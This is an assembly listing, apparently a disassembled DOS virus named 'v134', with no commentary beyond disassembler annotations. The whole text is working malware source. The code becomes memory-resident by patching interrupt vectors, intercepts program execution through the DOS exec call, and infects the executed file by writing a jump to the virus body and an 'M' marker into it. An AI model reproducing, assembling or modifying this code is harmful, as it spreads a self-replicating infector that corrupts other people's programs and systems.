data_1e     equ 0FEE0h          ; (0000:FEE0=4D20h)
data_2e     equ 0FFh            ; (8063:00FF=0)
data_7e     equ 8220h           ; (8063:8220=0)
data_8e     equ 8420h           ; (8063:8420=0)
data_9e     equ 9193h           ; (8063:9193=0)

code segment    byte public
assume  cs:code, ds:code
.286

        org 100h

v134        proc    far

start:
        jmp loc_1           ; (08D4)
        db  1000 dup (90h)

        db  0CDh, 20h, 90h
loc_1:      
        pusha               ;  xref 8063:0100
        mov di,si           ; (8063:0100=0E9h)
        dec     si
        mov bx,offset i_loc - offset loc_1 + 605h
        mov cx,50h
        add si,[si+2]
        movsw               ; Mov [si] to es:[di]
        movsb               ; Mov [si] to es:[di]
        mov es,cx
        cmpsb               ; Cmp [si] to es:[di]
        jz  loc_3           ; Jump if zero
        dec si
        MOV     DI,OFFSET LOC_5+1
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        mov es,cx
        xchg    ax,bx
        xchg    ax,cx
loc_2:                      ;  xref 8063:08FA
        xchg    ax,cx
        xchg    ax,es:data_1e[di]   ; (0000:FEE0=4D20h)
        stosw               ; Store ax to es:[di]
        jcxz    loc_2           ; Jump if cx=0
        xchg    ax,bx
loc_3:                      ;  xref 8063:08E9
        push    ds
        pop es
        popa
        jmp si
i_loc:
        cmp ax,4B00h
        jne loc_5           ; Jump if not equal
        pusha
        push    ds
        push    es
        mov ax,3D02h
        call    sub_2           ; (0949)
        jc  loc_4           ; Jump if carry Set
        cbw             ; Convrt byte to word
        cwd             ; Word to double word
        mov bx,si
        mov ds,ax
        mov es,ax
        mov ah,3Fh          ; '?'
        int 69h
        mov al,4Dh          ; 'M'
        repne   scasb           ; Rep zf=0+cx >0 Scan es:[di] for al
        jz  loc_4           ; Jump if zero
        mov al,2
        call    sub_1           ; (0946)
        mov cl,86h
        int 69h
        mov al,0E9h
        stosb               ; Store al to es:[di]
        inc si
        xchg    ax,si
        stosw               ; Store ax to es:[di]
        mov al,4Dh          ; 'M'
        stosb               ; Store al to es:[di]
        xchg    ax,dx
        call    sub_1           ; (0946)
        int 69h
loc_4:                      ;  xref 8063:0910, 0922
        pop es
        pop ds
        popa
        seg     cs
loc_5:                      ;  xref 8063:0903
        jmp  dword ptr [01A4h]      ; (8063:01A4=2525h)

v134        endp

;��������������������������������������������������������������������������
;                  SUBROUTINE
;
;         Called from:   8063:0926, 0937
;��������������������������������������������������������������������������

sub_1       proc    near
        mov ah,42h          ; 'B'
        cwd             ; Word to double word

;���� External Entry into Subroutine ��������������������������������������
;
;         Called from:   8063:090D

sub_2:
        xor cx,cx           ; Zero register
        int 69h
        mov cl,3
        xchg    ax,si
        mov ax,4060h
        xor di,di           ; Zero register
        retn
sub_1       endp

code        ends

        end start
        